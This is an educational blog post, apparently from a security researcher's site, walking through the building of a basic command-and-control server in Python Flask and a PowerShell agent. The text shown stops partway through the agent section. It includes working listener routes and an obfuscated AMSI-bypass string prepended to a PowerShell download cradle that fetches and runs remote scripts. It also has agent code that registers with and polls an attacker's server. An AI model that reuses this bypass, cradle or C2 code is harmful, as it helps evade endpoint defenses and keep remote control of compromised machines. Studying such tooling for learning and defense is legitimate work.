<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Building a Basic C2 - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>It’s very common that after successful exploitation an attacker would put an agent that maintains communication with a c2 server on the compromised system, and the reason for that is very simple, having an agent that provides persistency over large periods and almost all the capabilities an attacker would need to perform lateral movement and other post-exploitation actions is better than having a reverse shell for example. There are a lot of free open source post-exploitation toolsets that provide this kind of capability, like <a href="https://www.metasploit.com/" target="_blank" rel="noopener">Metasploit</a>, <a href="https://www.powershellempire.com/" target="_blank" rel="noopener">Empire</a> and many others, and even if you only play CTFs it’s most likely that you have used one of those before.</p>
<p>Long story short, I only had a general idea about how these tools work and I wanted to understand the internals of them, so I decided to try and build one on my own. For the last three weeks, I have been searching and coding, and I came up with a very basic implementation of a c2 server and an agent. In this blog post I’m going to explain the approaches I took to build the different pieces of the tool.</p>
<p>Please keep in mind that some of these approaches might not be the best and also the code might be kind of messy, If you have any suggestions for improvements feel free to contact me, I’d like to know what better approaches I could take. I also like to point out that this is not a tool to be used in real engagements, besides only doing basic actions like executing <code>cmd</code> and <code>powershell</code>, I didn’t take in consideration any opsec precautions.</p>
<p>This tool is still a work in progress, I finished the base but I’m still going to add more execution methods and more capabilities to the agent. After adding new features I will keep writing posts similar to this one, so that people with more experience give feedback and suggest improvements, while people with less experience learn.</p>
<p>You can find the tool on <a href="https://github.com/0xRick/c2" target="_blank" rel="noopener">github</a>.</p>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><h3 id="About-c2-servers-agents"><a href="#About-c2-servers-agents" class="headerlink" title="About c2 servers / agents"></a>About c2 servers / agents</h3><p>As far as I know,</p>
<p>A basic c2 server should be able to:</p>
<ul>
<li>Start and stop listeners.</li>
<li>Generate payloads.</li>
<li>Handle agents and task them to do stuff.</li>
</ul>
<p>An agent should be able to:</p>
<ul>
<li>Download and execute its tasks.</li>
<li>Send results.</li>
<li>Persist.</li>
</ul>
<p>A listener should be able to:</p>
<ul>
<li>Handle multiple agents.</li>
<li>Host files.</li>
</ul>
<p>And all communications should be encrypted.</p>
<h3 id="About-the-Tool"><a href="#About-the-Tool" class="headerlink" title="About the Tool"></a>About the Tool</h3><p>The server itself is written in <code>python3</code>, I wrote two agents, one in <code>c++</code> and the other in <code>powershell</code>, listeners are <code>http</code> listeners.</p>
<p>I couldn’t come up with a nice name so I would appreciate suggestions.</p>
<h2 id="Listeners"><a href="#Listeners" class="headerlink" title="Listeners"></a>Listeners</h2><h3 id="Basic-Info"><a href="#Basic-Info" class="headerlink" title="Basic Info"></a>Basic Info</h3><p>Listeners are the core functionality of the server because they provide the way of communication between the server and the agents. I decided to use <code>http</code> listeners, and I used <code>flask</code> to create the listener application.</p>
<p>A <code>Listener</code> object is instantiated with a name, a port and an <code>IP</code> address to bind to:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listener</span>:</span>    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, port, ipaddress)</span>:</span></span><br><span class="line">        </span><br><span class="line">        self.name       = name</span><br><span class="line">        self.port       = port</span><br><span class="line">        self.ipaddress  = ipaddress</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>Then it creates the needed directories to store files, and other data like the encryption key and agents’ data:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...	</span><br><span class="line">    	</span><br><span class="line">self.Path       = <span class="string">"data/listeners/&#123;&#125;/"</span>.format(self.name)</span><br><span class="line">self.keyPath    = <span class="string">"&#123;&#125;key"</span>.format(self.Path)</span><br><span class="line">self.filePath   = <span class="string">"&#123;&#125;files/"</span>.format(self.Path)</span><br><span class="line">self.agentsPath = <span class="string">"&#123;&#125;agents/"</span>.format(self.Path)</span><br><span class="line">        </span><br><span class="line">...</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> os.path.exists(self.Path) == <span class="literal">False</span>:</span><br><span class="line">    os.mkdir(self.Path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(self.agentsPath) == <span class="literal">False</span>:</span><br><span class="line">    os.mkdir(self.agentsPath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(self.filePath) == <span class="literal">False</span>:</span><br><span class="line">    os.mkdir(self.filePath)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>After that it creates a key, saves it and stores it in a variable (more on <code>generateKey()</code> in the encryption part):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> os.path.exists(self.keyPath) == <span class="literal">False</span>:</span><br><span class="line">    </span><br><span class="line">    key      = generateKey()</span><br><span class="line">    self.key = key</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(self.keyPath, <span class="string">"wt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(key)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">with</span> open(self.keyPath, <span class="string">"rt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        self.key = f.read()</span><br><span class="line">            </span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<h3 id="The-Flask-Application"><a href="#The-Flask-Application" class="headerlink" title="The Flask Application"></a>The Flask Application</h3><p>The flask application which provides all the functionality of the listener has 5 routes: <code>/reg</code>, <code>/tasks/&lt;name&gt;</code>, <code>/results/&lt;name&gt;</code>, <code>/download/&lt;name&gt;</code>, <code>/sc/&lt;name&gt;</code>.</p>
<h4 id="reg"><a href="#reg" class="headerlink" title="/reg"></a><code>/reg</code></h4><p><code>/reg</code> is responsible for handling new agents, it only accepts <code>POST</code> requests and it takes two parameters: <code>name</code> and <code>type</code>. <code>name</code> is for the <code>hostname</code> while  <code>type</code> is for the agent’s type.</p>
<p>When it receives a new request it creates a random string of 6 uppercase letters as the new agent’s name (that name can be changed later), then it takes the <code>hostname</code> and the agent’s type from the request parameters. It also saves the remote address of the request which is the <code>IP</code> address of the compromised host.</p>
<p>With these information it creates a new <code>Agent</code> object and saves it to the agents database, and finally it responds with the generated random name so that the agent on the other side can know its name.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@self.app.route("/reg", methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">registerAgent</span><span class="params">()</span>:</span></span><br><span class="line">    name     = <span class="string">''</span>.join(choice(ascii_uppercase) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>))</span><br><span class="line">    remoteip = flask.request.remote_addr</span><br><span class="line">    hostname = flask.request.form.get(<span class="string">"name"</span>)</span><br><span class="line">    Type     = flask.request.form.get(<span class="string">"type"</span>)</span><br><span class="line">    success(<span class="string">"Agent &#123;&#125; checked in."</span>.format(name))</span><br><span class="line">    writeToDatabase(agentsDB, Agent(name, self.name, remoteip, hostname, Type, self.key))</span><br><span class="line">    <span class="keyword">return</span> (name, <span class="number">200</span>)</span><br></pre></td></tr></table></figure>



<h4 id="tasks-lt-name-gt"><a href="#tasks-lt-name-gt" class="headerlink" title="/tasks/&lt;name&gt;"></a><code>/tasks/&lt;name&gt;</code></h4><p><code>/tasks/&lt;name&gt;</code> is the endpoint that agents request to download their tasks, <code>&lt;name&gt;</code> is a placeholder for the agent’s name, it only accepts <code>GET</code> requests.</p>
<p>It simply checks if there are new tasks (by checking if the tasks file exists), if there are new tasks it responds with the tasks, otherwise it sends an empty response (<code>204</code>).</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@self.app.route("/tasks/&lt;name&gt;", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serveTasks</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">"&#123;&#125;/&#123;&#125;/tasks"</span>.format(self.agentsPath, name)):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"&#123;&#125;&#123;&#125;/tasks"</span>.format(self.agentsPath, name), <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            task = f.read()</span><br><span class="line">            clearAgentTasks(name)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span>(task,<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">''</span>,<span class="number">204</span>)</span><br></pre></td></tr></table></figure>



<h4 id="results-lt-name-gt"><a href="#results-lt-name-gt" class="headerlink" title="/results/&lt;name&gt;"></a><code>/results/&lt;name&gt;</code></h4><p><code>/results/&lt;name&gt;</code> is the endpoint that agents request to send results, <code>&lt;name&gt;</code> is a placeholder for the agent’s name, it only accepts <code>POST</code> requests and it takes one parameter: <code>result</code> for the results.</p>
<p>It takes the results and sends them to a function called <code>displayResults()</code> (more on that function in the agent handler part), then it sends an empty response <code>204</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@self.app.route("/results/&lt;name&gt;", methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receiveResults</span><span class="params">(name)</span>:</span></span><br><span class="line">    result = flask.request.form.get(<span class="string">"result"</span>)</span><br><span class="line">    displayResults(name, result)</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">''</span>,<span class="number">204</span>)</span><br></pre></td></tr></table></figure>



<h4 id="download-lt-name-gt"><a href="#download-lt-name-gt" class="headerlink" title="/download/&lt;name&gt;"></a><code>/download/&lt;name&gt;</code></h4><p><code>/download/&lt;name&gt;</code> is responsible for downloading files, <code>&lt;name&gt;</code> is a placeholder for the file name, it only accepts <code>GET</code> requests.</p>
<p>It reads the requested file from the files path and it sends it.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@self.app.route("/download/&lt;name&gt;", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendFile</span><span class="params">(name)</span>:</span></span><br><span class="line">    f    = open(<span class="string">"&#123;&#125;&#123;&#125;"</span>.format(self.filePath, name), <span class="string">"rt"</span>)</span><br><span class="line">    data = f.read()</span><br><span class="line">            </span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> (data, <span class="number">200</span>)</span><br></pre></td></tr></table></figure>



<h4 id="sc-lt-name-gt"><a href="#sc-lt-name-gt" class="headerlink" title="/sc/&lt;name&gt;"></a><code>/sc/&lt;name&gt;</code></h4><p><code>/sc/&lt;name&gt;</code> is just a wrapper around the <code>/download/&lt;name&gt;</code> endpoint for <code>powershell</code> scripts, it responds with a download cradle prepended with a oneliner to bypass <code>AMSI</code>, the oneliner downloads the original script from <code>/download/&lt;name&gt;</code> ,  <code>&lt;name&gt;</code> is a placeholder for the script name, it only accepts <code>GET</code> requests.</p>
<p>It takes the script name, creates a download cradle in the following format:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://IP:PORT/download/SCRIPT_NAME'</span>)</span><br></pre></td></tr></table></figure>

<p>and prepends that with the oneliner and responds with the full line.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@self.app.route("/sc/&lt;name&gt;", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendScript</span><span class="params">(name)</span>:</span></span><br><span class="line">    amsi     = <span class="string">"sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"&#123;1&#125;&#123;0&#125;\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"&#123;6&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"&#123;0&#125;&#123;2&#125;&#123;1&#125;\" -f'amsi','d','InitFaile' ),(\"&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"($&#123;n`ULl&#125;,$&#123;t`RuE&#125; ); "</span></span><br><span class="line">    oneliner = <span class="string">"&#123;&#125;IEX(New-Object Net.WebClient).DownloadString(\'http://&#123;&#125;:&#123;&#125;/download/&#123;&#125;\')"</span>.format(amsi,self.ipaddress,str(self.port),name)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (oneliner, <span class="number">200</span>)</span><br></pre></td></tr></table></figure>



<h3 id="Starting-and-Stopping"><a href="#Starting-and-Stopping" class="headerlink" title="Starting and Stopping"></a>Starting and Stopping</h3><p>I had to start listeners in threads, however <code>flask</code> applications don’t provide a reliable way to stop the application once started, the only way was to kill the process, but killing threads wasn’t also so easy, so what I did was creating a <code>Process</code> object for the function that starts the application, and a thread that starts that process which means that terminating the process would kill the thread and stop the application.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.app.logger.disabled = <span class="literal">True</span></span><br><span class="line">    self.app.run(port=self.port, host=self.ipaddress)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">    </span><br><span class="line">    self.server = Process(target=self.run)</span><br><span class="line"></span><br><span class="line">    cli = sys.modules[<span class="string">'flask.cli'</span>]</span><br><span class="line">    cli.show_server_banner = <span class="keyword">lambda</span> *x: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    self.daemon = threading.Thread(name = self.name,</span><br><span class="line">                                       target = self.server.start,</span><br><span class="line">                                       args = ())</span><br><span class="line">    self.daemon.daemon = <span class="literal">True</span></span><br><span class="line">    self.daemon.start()</span><br><span class="line"></span><br><span class="line">    self.isRunning = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(self)</span>:</span></span><br><span class="line">    </span><br><span class="line">    self.server.terminate()</span><br><span class="line">    self.server    = <span class="literal">None</span></span><br><span class="line">    self.daemon    = <span class="literal">None</span></span><br><span class="line">    self.isRunning = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<h2 id="Agents"><a href="#Agents" class="headerlink" title="Agents"></a>Agents</h2><h3 id="Basic-Info-1"><a href="#Basic-Info-1" class="headerlink" title="Basic Info"></a>Basic Info</h3><p>As mentioned earlier, I wrote two agents, one in <code>powershell</code> and the other in <code>c++</code>. Before going through the code of each one, let me talk about what agents do. </p>
<p>When an agent is executed on a system, first thing it does is get the hostname of that system then send the registration request to the server (<code>/reg</code> as discussed earlier). </p>
<p>After receiving the response which contains its name it starts an infinite loop in which it keeps checking if there are any new tasks, if there are new tasks it executes them and sends the results back to the server.</p>
<p>After each loop it sleeps for a specified amount of time that’s controlled by the server, the default sleep time is 3 seconds.</p>
<p>We can represent that in pseudo code like this:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span> hostname</span><br><span class="line">send [hostname, type], <span class="built_in">get</span> name</span><br><span class="line"></span><br><span class="line">loop&#123;</span><br><span class="line">	</span><br><span class="line">	check <span class="keyword">if</span> there are any <span class="keyword">new</span> tasks</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> new_tasks&#123;</span><br><span class="line">    	</span><br><span class="line">            execute tasks</span><br><span class="line">    	    send results</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="keyword">do</span> nothing</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    sleep n </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So far, agents can only do two basic things, execute <code>cmd</code> and <code>powershell</code>.</p>
<h3 id="PowerShell-Agent"><a href="#PowerShell-Agent" class="headerlink" title="PowerShell Agent"></a>PowerShell Agent</h3><p>I won’t talk about the crypto functions here, I will leave that for the encryption part.</p>
<p>First 5 lines of the agent are just the basic variables which are the <code>IP</code> address, port, key, name and the time to sleep:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span>   = <span class="string">"REPLACE_IP"</span></span><br><span class="line"><span class="variable">$port</span> = <span class="string">"REPLACE_PORT"</span></span><br><span class="line"><span class="variable">$key</span>  = <span class="string">"REPLACE_KEY"</span></span><br><span class="line"><span class="variable">$n</span>    = <span class="number">3</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">""</span></span><br></pre></td></tr></table></figure>

<p>As mentioned earlier, It gets the hostname, sends the registration request and receives its name:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hname</span> = [<span class="type">System.Net.Dns</span>]::GetHostName()</span><br><span class="line"><span class="variable">$type</span>  = <span class="string">"p"</span></span><br><span class="line"><span class="variable">$regl</span>  = (<span class="string">"http"</span> + <span class="string">':'</span> + <span class="string">"//<span class="variable">$ip</span>"</span> + <span class="string">':'</span> + <span class="string">"<span class="variable">$port</span>/reg"</span>)</span><br><span class="line"><span class="variable">$data</span>  = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    name = <span class="string">"<span class="variable">$hname</span>"</span> </span><br><span class="line">    type = <span class="string">"<span class="variable">$type</span>"</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$name</span>  = (<span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$regl</span> <span class="literal">-Body</span> <span class="variable">$data</span> <span class="literal">-Method</span> <span class="string">'POST'</span>).Content</span><br></pre></td></tr></table></figure>

<p>Based on the received name it creates the variables for the tasks <code>uri</code> and the results <code>uri</code>:</p>
